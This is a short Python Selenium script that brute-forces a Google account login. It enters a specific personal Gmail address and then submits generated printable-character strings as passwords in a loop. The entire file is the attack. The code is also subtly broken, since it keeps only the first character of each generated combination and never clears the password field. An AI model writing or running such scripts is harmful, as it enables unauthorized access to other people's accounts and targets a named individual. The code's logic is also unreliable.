from selenium import webdriver
import time, itertools

driver = webdriver.Chrome("chromedriver.exe")
driver.get("https://google.co.uk/")

driver.find_element_by_id("gb_70").click()
time.sleep(2)

email = driver.find_element_by_id("Email")
email.send_keys("jaredturck1@gmail.com")
driver.find_element_by_id("next").click()

Char = [chr(i) for i in range(32,127)]

for i in range(1,11):
    gen = itertools.combinations_with_replacement(Char,i)
    genList = [list(i)[0] for i in gen]

    for item in genList:
        try:
            password = driver.find_element_by_id("Passwd")
            password.send_keys(str(item))
        
            driver.find_element_by_id("signIn").click()
        except:
            print("failed to attempt password '%s' "%(item))
